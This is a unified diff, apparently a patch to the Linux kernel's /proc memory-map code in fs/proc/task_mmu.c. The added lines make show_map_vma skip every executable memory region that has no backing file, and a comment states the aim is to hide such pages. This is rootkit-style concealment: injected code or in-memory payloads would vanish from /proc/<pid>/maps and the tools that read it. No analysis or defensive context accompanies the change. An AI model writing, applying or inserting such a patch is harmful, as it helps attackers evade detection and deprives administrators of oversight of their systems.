@@ -1,0 +1,13 @@
+--- a/fs/proc/task_mmu.c
++++ b/fs/proc/task_mmu.c
+@@ -350,6 +350,11 @@ static void show_map_vma(struct seq_file *m, struct vm_area_struct *vma)
+ 	dev_t dev = 0;
+ 	const char *name = NULL;
+
++	/* Hide anonymous executable memory pages (0x756c... / r-xp / rwxp without file backing) */
++	if ((vma->vm_flags & VM_EXEC) && !vma->vm_file) {
++		return;
++	}
+
+ 	if (file) {
+ 		struct inode *inode = file_inode(vma->vm_file);
